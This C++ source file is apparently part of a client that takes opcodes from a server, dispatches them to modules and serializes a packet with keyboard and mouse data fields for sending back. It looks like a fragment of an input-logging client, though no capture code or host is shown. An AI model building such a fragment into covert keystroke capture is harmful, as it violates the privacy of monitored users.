//
// Created by lavigne on 10/4/17.
//

#include <iostream>
#include "client/Command.hpp"

Command::Command() {}

Command::~Command() {}

/*
 * Process découpe la commande reçu par le serveur puis la traite.
 */
bool                        Command::process(std::map<char, Module> modules, std::string received, boost::asio::streambuf &buf)
{
    std::ostream                    os(&buf);
    boost::archive::text_oarchive   ar(os);
    char                            code = received[0];

    Module                          module = modules[code];
    t_paquet                        *data = getMessageFormat(module);
    ar & data;
    if (data == NULL)
        return false;
    return true;
}

/*
 * Créer la structure à renvoyer au serveur.
 */
t_paquet                    *Command::getMessageFormat(Module module)
{
    t_paquet    *data = new t_paquet;

    data->kbdata = NULL;
    data->msdata = NULL;
    data->opcode = module.getOpcode();
    module.getDatas(data);
    if (data->kbdata == NULL && data->msdata == NULL)
        return NULL;
    return data;
}
